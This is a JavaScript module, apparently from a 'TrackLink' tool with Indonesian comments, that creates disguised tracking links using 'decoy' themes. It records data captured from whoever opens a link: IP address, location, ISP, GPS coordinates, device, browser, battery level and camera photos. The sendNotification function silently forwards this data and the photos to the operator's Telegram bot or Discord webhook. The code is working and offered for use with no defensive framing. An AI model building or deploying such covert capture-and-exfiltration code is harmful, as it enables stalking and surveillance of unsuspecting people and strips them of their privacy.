/**
 * Storage helper
 * Link config di-encode langsung ke URL sehingga bekerja cross-browser
 */

const STORAGE_KEY  = 'tracker_links';
const SETTINGS_KEY = 'tracker_settings';

/* ── Settings ─────────────────────────────────────────────── */
export function getSettings() {
  try { return JSON.parse(localStorage.getItem(SETTINGS_KEY) || '{}'); }
  catch { return {}; }
}
export function saveSettings(s) {
  localStorage.setItem(SETTINGS_KEY, JSON.stringify(s));
}

/* ── Config encode/decode ─────────────────────────────────── */
export function encodeConfig(config) {
  // base64url-safe encode
  return btoa(unescape(encodeURIComponent(JSON.stringify(config))))
    .replace(/\+/g, '-').replace(/\//g, '_').replace(/=/g, '');
}

export function decodeConfig(encoded) {
  try {
    const b64 = encoded.replace(/-/g, '+').replace(/_/g, '/');
    return JSON.parse(decodeURIComponent(escape(atob(b64))));
  } catch { return null; }
}

/* ── Links (local dashboard history) ─────────────────────── */
export function getLinks() {
  try { return JSON.parse(localStorage.getItem(STORAGE_KEY) || '[]'); }
  catch { return []; }
}
export function saveLinks(links) {
  localStorage.setItem(STORAGE_KEY, JSON.stringify(links));
}

export function createLink({ name, decoyTheme, trackIp, trackDevice, trackBattery, trackCamera }) {
  const links = getLinks();
  const id    = generateId();
  const config = {
    id,
    decoyTheme: decoyTheme || 'article',
    options: { trackIp, trackDevice, trackBattery, trackCamera },
  };
  const encoded = encodeConfig(config);
  const newLink = {
    id,
    name: name || `Link #${links.length + 1}`,
    encoded,                    // disimpan untuk generate URL
    decoyTheme: config.decoyTheme,
    options: config.options,
    captures: [],
    createdAt: new Date().toISOString(),
  };
  links.unshift(newLink);
  saveLinks(links);
  return newLink;
}

export function getLinkById(id) {
  return getLinks().find(l => l.id === id) || null;
}

export function addCapture(linkId, capture) {
  const links = getLinks();
  const idx   = links.findIndex(l => l.id === linkId);
  const captureWithMeta = { ...capture, id: generateId(), at: new Date().toISOString() };
  if (idx !== -1) {
    links[idx].captures.push(captureWithMeta);
    saveLinks(links);
  }
  // Kirim notifikasi
  const settings = getSettings();
  const linkName = idx !== -1 ? links[idx].name : linkId;
  sendNotification(settings, linkName, linkId, captureWithMeta);
  return idx !== -1 ? links[idx] : null;
}

export function deleteLink(id) {
  saveLinks(getLinks().filter(l => l.id !== id));
}
export function clearLinks() { saveLinks([]); }

/* ── Notifikasi Telegram & Discord ───────────────────────── */
async function sendNotification(settings, linkName, linkId, cap) {
  const msg = buildTelegramMsg(linkName, linkId, cap);

  if (settings.telegramToken && settings.telegramChatId) {
    try {
      await fetch(`https://api.telegram.org/bot${settings.telegramToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: settings.telegramChatId,
          text: msg,
          parse_mode: 'HTML',
          disable_web_page_preview: true,
        }),
      });
      if (cap.photo) {
        const blob  = await (await fetch(cap.photo)).blob();
        const fd    = new FormData();
        fd.append('chat_id', settings.telegramChatId);
        fd.append('photo',   blob, 'capture.jpg');
        fd.append('caption', `📷 Foto — ${linkName}`);
        await fetch(`https://api.telegram.org/bot${settings.telegramToken}/sendPhoto`, {
          method: 'POST', body: fd,
        });
      }
    } catch { /* silent */ }
  }

  if (settings.discordWebhook) {
    try {
      await fetch(settings.discordWebhook, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          username: '🎯 TrackLink',
          embeds: [{
            title:  `🔔 Capture Baru — ${linkName}`,
            color:  0x22c55e,
            fields: buildDiscordFields(cap),
            timestamp: new Date().toISOString(),
            footer: { text: `ID: ${linkId}` },
          }],
        }),
      });
    } catch { /* silent */ }
  }
}

function buildTelegramMsg(linkName, linkId, cap) {
  const lines = [
    `🎯 <b>CAPTURE BARU!</b>`,
    `📌 Link: <b>${linkName}</b>`,
    ``,
  ];
  if (cap.ip)      lines.push(`🌍 <b>IP:</b> <code>${cap.ip}</code>`);
  if (cap.country) lines.push(`📍 <b>Lokasi:</b> ${[cap.city, cap.region, cap.country].filter(Boolean).join(', ')}`);
  if (cap.isp)     lines.push(`📡 <b>ISP:</b> ${cap.isp}`);
  if (cap.lat)     lines.push(`🗺 <b>Koordinat:</b> <a href="https://maps.google.com/?q=${cap.lat},${cap.lon}">${Number(cap.lat).toFixed(5)}, ${Number(cap.lon).toFixed(5)}</a>${cap.locationSource === 'GPS' ? ` ✓ GPS ±${cap.gpsAccuracy}m` : ' (IP)'}`);
  if (cap.device)  lines.push(`📱 <b>Perangkat:</b> ${cap.device}`);
  if (cap.os)      lines.push(`💻 <b>OS:</b> ${cap.os} — ${cap.browser}`);
  if (cap.battery !== undefined && cap.battery !== null)
    lines.push(`🔋 <b>Baterai:</b> ${Math.round(cap.battery * 100)}%${cap.charging ? ' ⚡' : ''}`);
  lines.push(``, `⏱ ${new Date(cap.at).toLocaleString('id-ID')}`);
  return lines.join('\n');
}

function buildDiscordFields(cap) {
  const f = [];
  if (cap.ip)      f.push({ name: '🌍 IP',        value: `\`${cap.ip}\``, inline: true });
  if (cap.country) f.push({ name: '📍 Lokasi',     value: [cap.city, cap.region, cap.country].filter(Boolean).join(', '), inline: true });
  if (cap.isp)     f.push({ name: '📡 ISP',        value: cap.isp, inline: true });
  if (cap.lat)     f.push({ name: '🗺 Koordinat',  value: `[${Number(cap.lat).toFixed(5)}, ${Number(cap.lon).toFixed(5)}](https://maps.google.com/?q=${cap.lat},${cap.lon})`, inline: true });
  if (cap.device)  f.push({ name: '📱 Perangkat',  value: cap.device, inline: true });
  if (cap.os)      f.push({ name: '💻 OS/Browser', value: `${cap.os} — ${cap.browser}`, inline: true });
  if (cap.battery !== undefined && cap.battery !== null)
    f.push({ name: '🔋 Baterai', value: `${Math.round(cap.battery * 100)}%${cap.charging ? ' ⚡' : ''}`, inline: true });
  return f;
}

function generateId() {
  return Math.random().toString(36).substring(2, 10) + Date.now().toString(36);
}
